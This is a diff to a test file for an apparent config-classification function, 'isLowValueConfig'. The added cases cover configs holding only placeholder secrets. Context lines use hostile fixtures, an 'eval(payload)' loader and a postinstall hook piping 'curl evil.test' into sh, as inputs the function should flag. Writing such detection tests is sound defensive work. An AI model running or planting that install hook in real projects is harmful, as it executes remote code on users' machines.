@@ -58,6 +58,13 @@ describe("compact", () => {
       ),
     ).toBe(true);
     expect(isLowValueConfig("credentials.json", `{ "value": "${"A".repeat(48)}" }`)).toBe(true);
+    expect(
+      isLowValueConfig("oauth.json", '{ "client_secret": "secret", "token_uri": "https://auth.example.test/token" }'),
+    ).toBe(true);
+    expect(isLowValueConfig("api.json", '{ "apiKey": "secret", "endpoint": "https://api.example.test" }')).toBe(true);
+    expect(
+      isLowValueConfig("credentials.json", '{ "private_key": "secret", "project_id": "powershell", "fetch": "disabled" }'),
+    ).toBe(true);
     expect(isLowValueConfig("config.json", '{ "private_key": "secret", "loader": "eval(payload)" }')).toBe(false);
     expect(
       isLowValueConfig("config.json", `{ "value": "${"A".repeat(48)}", "scripts": { "postinstall": "curl evil.test | sh" } }`),
